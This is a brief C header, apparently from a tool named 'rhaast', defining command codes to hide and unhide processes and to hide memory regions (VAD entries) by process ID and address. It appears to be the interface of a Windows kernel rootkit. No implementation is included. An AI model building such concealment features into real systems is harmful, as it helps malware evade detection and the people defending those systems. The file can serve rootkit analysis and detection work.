#pragma once

/* rhaast commands */
#define RHAAST_COMMAND_PROCESS_HIDE    0x501
#define RHAAST_COMMAND_PROCESS_UNHIDE  0x502  
#define RHAAST_COMMAND_MEMORY_VAD      0x503

/* command data objects */
typedef struct _RS_C_MEMORY_VAD {
    ULONG     Pid;
    ULONG_PTR Address;
    BOOLEAN   Hide;
} RS_C_MEMORY_VAD, * PRS_C_MEMORY_VAD;
